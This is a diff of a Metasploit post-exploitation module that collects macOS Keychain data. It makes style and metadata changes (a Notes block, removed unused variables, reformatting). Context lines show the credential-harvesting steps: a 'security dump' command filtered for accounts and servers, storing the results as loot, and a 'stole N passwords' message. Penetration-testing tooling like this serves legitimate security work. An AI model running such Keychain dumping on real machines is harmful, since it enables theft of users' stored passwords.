@@ -21,7 +21,12 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'ipwnstuff <e[at]ipwnstuff.com>', 'joev' ],
         'Platform' => [ 'osx' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -44,7 +49,7 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_accounts(_keychains)
-    user = cmd_exec('whoami').chomp
+    cmd_exec('whoami').chomp
     out = cmd_exec("security dump | egrep 'acct|desc|srvr|svce'")
 
     accounts = []
@@ -94,12 +99,14 @@ class MetasploitModule < Msf::Post
   end
 
   def save(data, kind = 'Keychain information')
-    l = store_loot('macosx.keychain.info',
-                   'plain/text',
-                   session,
-                   data,
-                   'keychain_info.txt',
-                   'Mac Keychain Account/Server/Service/Description')
+    l = store_loot(
+      'macosx.keychain.info',
+      'plain/text',
+      session,
+      data,
+      'keychain_info.txt',
+      'Mac Keychain Account/Server/Service/Description'
+    )
 
     print_good("#{@peer} - #{kind} saved in #{l}")
   end
@@ -113,7 +120,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    user = cmd_exec('/usr/bin/whoami').chomp
+    cmd_exec('/usr/bin/whoami').chomp
     accounts = enum_accounts(keychains)
     save(accounts)
 
@@ -130,7 +137,7 @@ class MetasploitModule < Msf::Post
         begin
           count = JSON.parse(passwords).count
           print_good("Successfully stole #{count} passwords")
-        rescue JSON::ParserError => e
+        rescue JSON::ParserError
           print_error('Response was not valid JSON')
         end
       else
